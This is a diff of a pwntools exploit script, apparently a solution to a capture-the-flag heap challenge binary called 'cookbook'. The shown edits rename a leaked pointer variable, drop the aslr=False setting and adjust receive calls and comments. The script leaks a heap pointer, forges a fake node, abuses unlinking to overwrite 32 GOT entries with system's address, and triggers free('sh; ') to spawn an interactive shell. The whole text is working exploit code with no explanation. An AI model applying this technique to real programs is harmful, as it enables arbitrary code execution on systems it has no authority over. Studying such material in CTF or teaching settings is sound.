@@ -10,7 +10,8 @@
 from pwn import *
 import re
 
-r = process('./cookbook', aslr=False)
+#r = process('./cookbook', aslr=False)
+r = process('./cookbook')
 b = ELF('./cookbook')
 libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 
@@ -28,7 +29,6 @@ if __name__ == "__main__":
     s('n') # malloc()
     s('d') # free()
     s('q')
-
     r.recv()
 
     s('a')
@@ -106,8 +106,8 @@ if __name__ == "__main__":
     s('q')
     r.recv()
     
-    ORIGINAL_PTR = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
-    log.info('ORIGINAL_PTR: 0x%x' % ORIGINAL_PTR)
+    SAVED_PTR = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
+    log.info('SAVED_PTR: 0x%x' % SAVED_PTR)
 
     #
     # [5] make the fake second node
@@ -141,7 +141,7 @@ if __name__ == "__main__":
     s('q')
     s('g')
     s('9')
-    s(p32(ORIGINAL_PTR)+p32(0x804d098) + '\x00')
+    s(p32(SAVED_PTR)+p32(0x804d098) + '\x00')
     r.recv()
 
     #
@@ -153,15 +153,16 @@ if __name__ == "__main__":
     s('r')
     s('corn\x00')
     s('q')
+    r.recv()
 
     #
-    # [8] overwrite 32 got entries
+    # [8] overwrite 32 GOT entries
     #
     # after the unlinking, CURRENT_INGREDIENT == 0x804cff8
-    # 'ag' => memcpy((char *)CURRENT_INGREDIENT + 8, "sh; \x00\x00\x00\x00" + p32(SYSTEM_ADDR)*32")
+    # 'ag' => memcpy((char *)CURRENT_INGREDIENT + 8, "sh; \x00\x00\x00\x00" + p32(SYSTEM_ADDR)...")
     #
     raw_input('[8] go?')
     s('a')
     s('g')
-    s('sh; ' + p32(0) + p32(SYSTEM_ADDR) * 32)
+    s('sh; ' + p32(0) + p32(SYSTEM_ADDR) * 32) # 32 overwrites!!!
     r.interactive() # free("sh; \x00") => system("sh; \x00")
